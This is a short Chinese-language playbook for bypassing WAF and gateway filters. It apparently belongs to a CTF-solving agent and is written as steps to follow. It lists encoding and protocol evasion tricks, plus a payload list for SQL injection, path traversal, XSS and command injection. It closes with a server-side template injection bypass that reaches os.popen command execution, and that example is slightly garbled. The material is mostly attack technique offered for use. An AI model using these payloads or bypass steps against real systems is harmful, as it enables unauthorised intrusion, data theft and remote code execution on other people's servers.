# 过滤器绕过（WAF/网关/自定义过滤）

## 触发条件
请求被拦截（403/406/自定义拦截页）、关键字被替换或删除、响应明显被改写。

## 决策树
1. 定位拦截维度：逐个字符二分，找出被拦的关键字/符号；
2. 编码绕过：URL 双重编码 / Unicode / HTML 实体 / 大小写混合 / 注释符内联（/*!and*/）；
3. 协议绕过：分块传输 / Content-Type 变换 / 参数污染（同名参数重复）；
4. 等价改写：|| 换 or、`'OR'1'='1` 换 admin'-- -、空格换 /**/ 或 %a0；
5. 仍不通：distinguish 差分定位精确拦截点，再针对性构造。

## payload 库
- SQL 关键字：`/**/`、`%0a`、`/*!50000union*/`、大小写混合 `UnIoN sElEcT`
- 路径穿越：`....//`、`..%2f`、`%252e%252e%252f`、Unicode `%c0%ae`
- XSS：`<img src=x onerror=alert(1)>`、`<svg/onload=...>`、大小写/实体混合
- 命令注入：`;`、`|`、`$(...)`、反引号、`%0a` 换行注入

## SSTI 绕过法（ctfSolver master）
1. 若 `{{` 被拦截，先不传 `{{`：直接传 `a*b`（或从 `1*1` 起）观察是否被模板引擎渲染，据此确认后端模板与过滤点；
2. 常见绕过示例：`{绕过：(self.__init__.__globals__.__builtins__.__import__('os').popen('ls').read())`；
3. 多轮迭代：每轮根据响应差异调整策略，用 python 脚本验证并打印结果；
4. 最终目标是达成代码执行/触发（如 SSTI 需执行到命令）。

## 收尾判据
载荷原样到达后端（响应出现预期业务结果而非拦截页）。
